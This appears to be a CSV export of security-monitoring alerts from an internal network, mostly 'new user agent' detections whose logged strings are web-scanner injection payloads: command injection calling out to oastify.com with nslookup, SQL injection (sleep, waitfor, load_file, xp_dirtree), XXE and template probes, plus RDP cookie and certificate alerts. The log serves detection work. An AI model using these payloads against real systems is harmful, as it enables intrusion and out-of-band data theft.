SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,33135,2025-03-28T10:17Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36i7mumcb4qb' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,5be53df1-416f-48da-99ac-2ccb12c0e0ba,
Low,33136,2025-03-28T10:16:33Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 cq1c1w89g0' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,6380d91c-6d06-42b7-8082-8f62a1b3a757,
Low,33137,2025-03-28T10:16:32Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 yguub9gp37' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (oastify.com).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,1b8ad3f1-34f9-4c86-9b31-90df3230fe14,
Low,33138,2025-03-28T10:17:06Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 g4v3hu2v00' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,b2055358-862c-4f52-b0fa-40293038f8f4,
Low,33139,2025-03-28T10:16:59Z,Communication,Configuration,New Global User Agent,User Agent '0pd70gcnbx' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,de7639dd-c1cd-4ed8-9f08-229aba39ac4a,
Low,33140,2025-03-28T10:17:07Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 ant657r28r' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (oastify.com).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,b0ad2592-8f73-47ee-8673-32b95f096db0,
Low,33141,2025-03-28T10:16:32Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,9e3c83a7-5dbc-49c8-a069-c90ae93ce4ad,
Low,33142,2025-03-28T10:16:32Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 m7l0t0zxup' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,9f0db627-00f7-4921-9c2b-c8c3793f2397,
Low,33143,2025-03-28T10:16:07Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36&nslookup -q=cname 5v1ob6gsorv59e91f30wgmwhb8h15stnhi48sx.oastify.com.&'\""`0&nslookup -q=cname 5v1ob6gsorv59e91f30wgmwhb8h15stnhi48sx.oastify.com.&`'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,625653ba-b2d4-43d1-ba26-703b5cefb4cc,
Low,33144,2025-03-28T10:16:07Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|echo 23a2j8gya7 3md51wdqe4||a #' |echo 23a2j8gya7 3md51wdqe4||a #|"" |echo 23a2j8gya7 3md51wdqe4||a #' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,655d05d1-ffb6-4b4a-a695-ec938a856cfc,
Low,33145,2025-03-28T10:16:06Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname qke90r5ddckqyzym4oph57l20t6mudia65tvhk.oastify.com.&`'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,68945de8-cbc9-4bce-a91d-f24b1959242a,
Low,33146,2025-03-28T10:16:07Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'+(function(){if(typeof wu0jw===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);wu0jw=1;}}())+'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,80fce6f3-e2fb-4ab6-b586-6ec853dbf402,
Low,33147,2025-03-28T10:16:06Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36{${sleep(20)}}' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,5f7395e6-d880-43d1-bb1b-78d53f2158b5,
Low,33148,2025-03-28T10:16:06Z,Communication,Configuration,New Global User Agent,User Agent 'nslookup -q=cname co4v4d9zhyoc2l288at39tpo4fa8yzmspgk3arz.oastify.com.&' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,09707913-0c00-4875-b5ed-aea859340b95,
Low,33149,2025-03-28T10:16:06Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,765824a9-48a9-4926-9f02-7f380f93bf26,
Low,33150,2025-03-28T10:16:05Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36}}t3znb'/""<s44gy' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,7fea8411-c54b-449e-b638-8aed96bd39cd,
Low,33151,2025-03-28T10:16:05Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36%}q8rbk'/""<zuqb3' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,189439cc-a21d-49ae-a14b-808c45b82c8f,
Low,33152,2025-03-28T10:16:06Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36xka2l%>hupsz'/""<qsoxk' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,dd8c0e77-346d-4419-8c5d-d434020c6c62,
Low,33153,2025-03-28T10:16:05Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36uibqmkom69' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,ed1a03d3-3cbe-48f1-bd49-d207c8861d4b,
Low,33154,2025-03-28T10:16:05Z,Communication,Configuration,New Global User Agent,User Agent 'yw0lkpb41n' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,d066c38c-bb09-4267-acc8-d8ee18f29432,
Low,33155,2025-03-28T10:16:05Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36""' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,149a9954-d612-4c62-a59a-77a41114074c,
Low,33156,2025-03-28T10:16:04Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '7728'='7733' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,eb8b2dec-7d91-4fcc-b941-4ed67dec2d0c,
Low,33157,2025-03-28T10:16:04Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '6153'='6153' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,84f677dc-a8e5-4b77-9a0d-daa5ac9d67c4,
Low,33158,2025-03-28T10:16:04Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,3082db0e-30b5-4fec-8bb9-ac15a02de2d9,
Low,33159,2025-03-28T10:16:04Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 8344=8353--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,a36ec814-4ede-48d8-8d36-3907dfa64f72,
Low,33160,2025-03-28T10:16:03Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3668031023' or '9321'='9322' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,3ec1ffba-2614-4de1-89eb-171666c1d68f,
Low,33161,2025-03-28T10:16:03Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3696056524' or 9496=9496--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,03d67852-d7da-4023-80d2-ca96379f3c5c,
Low,33162,2025-03-28T10:16:03Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3656815615' or '9543'='9543' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,489fe9d3-bab3-4686-ad7c-c155cc7a07ba,
Low,33163,2025-03-28T10:16:02Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'(select*from(select(sleep(20)))a)'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,41ebe82f-8cac-48eb-bd0d-c55602261dc8,
Low,33164,2025-03-28T10:16:02Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' waitfor delay'0:0:20'--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,2d6c2dad-7efb-4e57-8029-167d88f01f0f,
Low,33165,2025-03-28T10:16:03Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',''||pg_sleep(20)--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,401b7773-99c5-4caa-8f58-f6f1cd5c7b7c,
Low,33166,2025-03-28T10:16:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'+(select load_file('\\\\fwfycgh2p1wfaoabgd16hwxrciib62utxhs4is7.oastify.com\\bfp'))+'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,be5935c4-cff1-4459-9801-fbefe4a77b90,
Low,33167,2025-03-28T10:16:01Z,Communication,Configuration,New Global User Agent,User Agent '(select load_file('\\\\zbeir0wm4lbzp8pvvxgqwgcbr2xvlm9db16owcl.oastify.com\\uva'))' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).,User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,6e7a6bb1-4e3c-45b6-ae3e-ed71c142d461,
Low,33168,2025-03-28T10:16:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36');declare @q varchar(99);set @q='\\e4jxkfp1x04einiaoc95pv5qkhqae12svgq3gr5.oasti'+'fy.com\dzm'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,e6bdd0b7-1657-402f-a7be-7dd09cc2f129,
Low,33169,2025-03-28T10:16:01Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36);declare @q varchar(99);set @q='\\kzn3flk7s6zkdtdgji4bk10wfnlg97xypmk9axz.oasti'+'fy.com\urb'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,18052285-e96b-4d11-b533-2a2cb3c9ea42,
Low,33170,2025-03-28T10:16Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';declare @q varchar(99);set @q='\\o0p7gplbta0oexekkm5fl510grmkaby2pqkda1z.oasti'+'fy.com\ohm'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,b648477d-3426-4ed4-89ea-a3c7e8273557,
Low,33171,2025-03-28T10:16Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36;declare @q varchar(99);set @q='\\wttf9xejmitw757sduynedu89zfs3jrahycl29r.oasti'+'fy.com\yqq'; exec master.dbo.xp_dirtree @q;--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,1f9be484-ba75-4398-8f7c-2730b43b253c,
Low,33172,2025-03-28T10:16Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'||(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % xmjox SYSTEM ""http://68cpo7tt1s86mfm2s4dxtn9io9u2it6xushi57.oasti'||'fy.com/"">%xmjox;]>'),'/l') from dual)||'' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,e15320bb-81cb-4e0d-aa7b-1e505f038987,
Low,33173,2025-03-28T10:16Z,Communication,Configuration,New Global User Agent,"User Agent '(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % xmjox SYSTEM ""http://mrh57nc9k8rm5v5ibkwdc3sy7pdi19pcd70xom.oasti'||'fy.com/"">%xmjox;]>'),'/l') from dual)' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,694fdb15-83de-4fa1-b9a8-a55cbd10b739,
Low,33175,2025-03-28T10:16:04Z,Communication,Configuration,New Global User Agent,"User Agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3699252123' or 2389=2395--' was seen in the environment for the first time. Originating from asset 1914 (10.0.7.30) to 10.0.7.12 (localhost).",User Agent First Seen Globally,"1914,1841",,,10.0.7.30,10.0.7.12,,79351950-9bd2-48cf-b693-41c1b8fbaf2c,
Low,33552,2025-03-28T10:57:02Z,Communication,Configuration,Detected 12 RDP New Comms between 2025-03-28T10:42:07.274Z and 2025-03-28T10:57:02.611Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.7.30, 10.0.2.44, 10.0.7.11, 10.0.10.11, 10.0.10.29, 10.0.7.44, 10.0.1.11, 10.0.2.30;
  dst_asset_id: 154, 1772, 1919, 1768, 1914, 143, 151;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.7.30, 10.0.10.30, 10.0.1.30, 10.0.2.44, 10.0.7.11, 10.0.7.44, 10.0.2.30;
  rdp_selected_protocol: , hybrid, hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 45, 154, 1772, 1801, 1735, 1768, 1914, 143;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , plumber, jack, plumbet, administrator, alice, devel;
  src__ip: ;",RDP New Comms Pattern,"1914,1772,154,143,1919,1735,151,45,1768,1801",,,"10.0.7.30,10.0.7.11,10.0.2.30,10.0.2.44,10.0.10.11,10.0.1.11,10.0.7.44,10.0.10.29","10.0.7.30,10.0.7.11,10.0.2.30,10.0.2.44,10.0.10.30,10.0.1.30,10.0.7.44",,,
Low,33558,2025-03-28T10:53:50Z,Communication,Configuration,Detected 30 NewX509Certificate between 2025-03-28T10:39:33.023Z and 2025-03-28T10:53:50.707Z,"Sample NewX509Certificate values include:
  server: 20.190.160.132, 184.25.50.177, 40.126.31.67, 95.100.158.122, 95.100.158.115, 52.182.143.209, 23.3.89.96, 2.16.110.161, 10.0.3.11, 142.250.74.202;
  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com, C=US, ST=WA, L=Redmond, O=Microsoft, OU=DSP, CN=*.prod.do.dsp.mp.microsoft.com, C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=arc.msn.com;
  not_before: , 2025-03-04T20:39:31Z, 2025-03-27T01:24:33Z, 2025-03-16T00:00:00Z, 2025-03-09T16:45:25Z;
  server_asset_id: 1713, 3846, 3845, 3860, 3858, 3865, 3847, 357, 3853, 3850;
  dst__port: ('',);
  dns: ;
  uuid: e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3;
  issuer: , C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft ECC Content Distribution Secure Server CA 2.1, C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 03, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA, DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA;
  client_asset_id: 1896, 48, 1801, 1763, 1704, 1914;
  src__mac: ;
  not_after: , 2026-03-04T20:39:31Z, 2026-03-27T01:24:33Z, 2025-09-05T16:45:25Z, 2025-09-16T23:59:59Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.7.30, 10.0.5.29, 10.0.4.29, 10.0.2.11, 10.0.10.29, 10.0.3.30;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"48,1713,3846,3845,3860,3858,3865,3847,357,3853,3850,1896,1801,1763,1704,1914",,,"10.0.3.11,23.32.238.128,40.126.31.67,20.42.73.24,95.100.158.115,23.11.206.96,40.90.65.142,20.190.160.4,142.250.185.110,104.208.16.90","10.0.2.11,10.0.3.30,10.0.10.29,10.0.4.29,10.0.5.29,10.0.7.30",,"e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3",
Low,33560,2025-03-28T10:51:20Z,Communication,Configuration,RDP New Cookie,New RDP cookie plumbet from host 10.0.7.11 (asset 1772) to host 10.0.7.30 (asset 1914).,RDP New Cookie,"1914,1772",,,10.0.7.11,10.0.7.30,,,
Low,33563,2025-03-28T10:56:55Z,Asset,Configuration,Detected 8 NewUserAgent between 2025-03-28T10:45:21.640Z and 2025-03-28T10:56:55.331Z,"Sample NewUserAgent values include:
  dst__port: ('',);
  uuid: 18522455-fe9b-470b-b4ff-0d8be15403a8, 1d86218a-d042-49d1-8f9b-bb5ad2b855f4, 00d1d61c-7408-40c8-a152-907e2c993151, dba9ad0b-ae26-4a4a-87f3-10caa440db9e, a6759d52-f587-49f4-8184-d1d09a43392e, 2f4b457c-b707-4b17-adc8-e9932db7aaf5, 187dbda4-b3b3-41f4-b92e-da69e197301a, 146fd20f-3117-4c0d-8aba-05158e416f82;
  src__mac: ;
  src_ip: 10.0.1.29, 10.0.7.30, 10.0.2.44, 10.0.4.29, 10.0.1.11, 10.0.5.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 45, 1936, 1763, 44, 1914, 143;
  dst__ip: ;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0, Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)), Microsoft BITS/7.8, Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.2849, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0, Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36;
  src__ip: ;",User Agent First Seen,"1936,1763,1914,45,143,44",,,,,"10.0.5.30,10.0.4.29,10.0.7.30,10.0.1.11,10.0.2.44,10.0.1.29","18522455-fe9b-470b-b4ff-0d8be15403a8, 1d86218a-d042-49d1-8f9b-bb5ad2b855f4, 00d1d61c-7408-40c8-a152-907e2c993151, dba9ad0b-ae26-4a4a-87f3-10caa440db9e, a6759d52-f587-49f4-8184-d1d09a43392e, 2f4b457c-b707-4b17-adc8-e9932db7aaf5, 187dbda4-b3b3-41f4-b92e-da69e197301a, 146fd20f-3117-4c0d-8aba-05158e416f82",
